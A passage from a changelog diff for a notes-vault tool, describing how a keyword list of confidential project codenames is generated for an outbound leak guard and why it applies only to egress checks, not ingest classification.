+  `overlay/keywords-generated/generated.md` from the vault's own notes: every
+  `project` note classified `Confidential` or above, plus its `aliases`, each
+  row naming the note it came from. On a vault with no classified project it is
+  zero rows and says so.
+  **`project` ONLY, and the narrowing was measured, not guessed.** The first
+  cut also took `person`/`company`/`concept` and produced 420 terms of which
+  most were unusable: `concept` gave `API`, `Adobe`, `asset management`,
+  `3-Tier`; `company` gave `IBM`, `McKinsey`, `Deloitte`, `BCG`; `person` gave
+  41 bare first names out of 204. `project` was the only type where every
+  derived term was a real codename. An over-refusing guard is switched off
+  within a day, so precision beats coverage. A third idea — "a protected term
+  never appears in Internal notes" — was tried and rejected: on the reference
+  vault its most important codename appears in 172 Internal notes, so a leakage
+  filter drops exactly that term while correctly dropping `API`.
+  **Frequency does not work and was measured, not assumed:** ranking
+  capitalised phrases by how much more often they appear in protected notes
+  than Internal ones returned 5,298 candidates topped by Portuguese stopwords
+  and transcript boilerplate. The corpus splits by language and note shape, not
+  by sensitivity.
+  **The generated ring is EGRESS-ONLY, and the placement is load-bearing.**
+  `provenance.py` computes `tier = mapped or "MNPI"`, so a keyword match LOWERS
+  the fail-closed ingest default; 659 of 670 MNPI documents on the reference
+  vault carry a generated term and would have been re-tiered to `Restricted`.
+  Owner ruling 2026-09-01: the guard reads generated merged over hand-written
+  (hand wins on a conflict), ingest classification reads only the hand-written
+  ring. `overlay.resolve_egress_keyword_tiers` is the merged resolver;
+  `resolve_keyword_tiers` keeps its exact previous meaning. The engine still
+  ships no terms.
+
+
 ## [0.20.35] — 2026-09-01
 ### Added
 - **`brain check-egress` — the outbound term guard (SEC-07).** The
